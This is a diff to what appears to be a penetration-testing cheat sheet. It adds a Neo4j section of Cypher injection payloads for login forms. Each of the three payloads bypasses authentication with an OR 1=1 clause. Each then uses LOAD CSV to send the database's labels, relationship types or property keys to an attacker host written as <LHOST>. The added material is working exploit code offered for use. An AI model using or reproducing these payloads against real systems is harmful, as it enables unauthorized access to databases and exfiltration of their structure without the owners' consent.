@@ -12,6 +12,7 @@
 - [MSSQL](#mssql)
 - [MySQL](#mysql)
 - [mysqldump](#mysqldump)
+- [Neo4j](#neo4j)
 - [NoSQL Injection](#nosql-injection)
 - [PostgreSQL](#postgresql)
 - [Redis](#redis)
@@ -472,6 +473,28 @@ sqlite> SELECT ## FROM db1.DeletedUserAudit;
 
 ```c
 $ mysqldump --databases <DATABASE> -u<USERNAME> -p<PASSWORD>    // no space between parameter and input!
+```
+
+## Neo4j
+
+### Cypher Injection
+
+#### Enumerating Labels
+
+```c
+{"username":"' OR 1=1 WITH 1 as a  CALL db.labels() yield label LOAD CSV FROM 'http://<LHOST>/?label='+label as l RETURN 0 as _0 //","password":"foobar"}
+```
+
+#### Enumerating Relationship Types
+
+```c
+{"username":"' OR 1=1 WITH 1 as a CALL db.relationshipTypes() YIELD relationshipType LOAD CSV FROM 'http://<LHOST>/?rel='+relationshipType as l RETURN 0 as _0 //","password":"user"}
+```
+
+#### Enumerating Property Keys
+
+```c
+{"username":"' OR 1=1 WITH 1 as a CALL db.propertyKeys() YIELD propertyKey LOAD CSV FROM 'http://<LHOST>/?prop='+propertyKey as l RETURN 0 as _0 //","password":"user"}
 ```
 
 ## NoSQL Injection
